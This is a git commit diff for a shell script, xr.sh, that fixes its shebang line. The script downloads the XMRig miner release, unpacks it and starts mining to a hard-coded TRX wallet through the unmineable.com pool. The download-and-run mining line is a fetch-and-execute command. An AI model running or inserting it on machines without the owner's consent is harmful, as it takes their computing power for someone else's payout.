e09b0f6d0753a82d48eb0add52816a702c81e40e
gyrogerald <97717251+gyrogerald@users.noreply.github.com>
2022-07-24 22:18:28 +0800

    Update xr.sh

--- xr.sh
+++ xr.sh
@@ -1,2 +1,2 @@
-#!bin/bash
+#!/bin/bash
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TSkJV45WYfJD9Qk2R7mwNasK8VDjkdDNYS.gass -p x
